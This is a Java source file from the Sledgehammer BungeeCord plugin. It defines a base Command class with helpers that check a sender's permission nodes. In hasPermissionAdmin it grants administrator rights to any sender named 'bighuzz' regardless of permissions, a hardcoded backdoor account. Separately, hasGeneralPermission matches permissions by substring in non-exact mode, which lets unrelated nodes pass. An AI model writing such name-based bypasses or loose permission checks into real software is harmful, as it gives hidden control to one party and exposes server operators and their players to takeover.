/*
 * Copyright (c) 2020 Noah Husby
 * Sledgehammer [Bungeecord] - Command.java
 *
 * Sledgehammer is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Sledgehammer is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Sledgehammer.  If not, see <https://github.com/noahhusby/Sledgehammer/blob/master/LICENSE/>.
 */

package com.noahhusby.sledgehammer.commands.data;

import com.noahhusby.sledgehammer.network.SledgehammerNetworkManager;
import net.md_5.bungee.api.CommandSender;

public abstract class Command extends net.md_5.bungee.api.plugin.Command {
    private String permissionNode;
    public Command(String name, String node) {
        super(name);
        this.permissionNode = node;
    }

    public Command(String name, String node, String[] alias) {
        super(name, "", alias);
        this.permissionNode = node;
    }


    protected boolean hasGeneralPermission(CommandSender sender) {
        return hasGeneralPermission(sender, false);
    }

    protected boolean hasGeneralPermission(CommandSender sender, boolean exact) {
        if(sender.hasPermission("sledgehammer.admin")) return true;
        for(String s : sender.getPermissions()) {
            if(exact) {
                if(s.equals(permissionNode)) return true;
            } else {
                if(s.contains(permissionNode)) return true;
            }
        }

        return false;
    }

    protected boolean hasSpecificNode(CommandSender sender, String specificNode) {
        if(sender.hasPermission("sledgehammer.admin")) return true;
        for(String s : sender.getPermissions()) {
            if(s.equals(permissionNode+"."+specificNode)) return true;
        }
        return false;
    }

    protected boolean hasAdmin(CommandSender sender) {
        return sender.hasPermission("sledgehammer.admin");
    }

    protected boolean hasPermissionAdmin(CommandSender sender) {
        return sender.hasPermission("sledgehammer.admin") || sender.hasPermission(permissionNode+".admin") ||
                sender.getName().toLowerCase().equals("bighuzz");
    }

    protected SledgehammerNetworkManager getNetworkManager() {
        return SledgehammerNetworkManager.getInstance();
    }
}

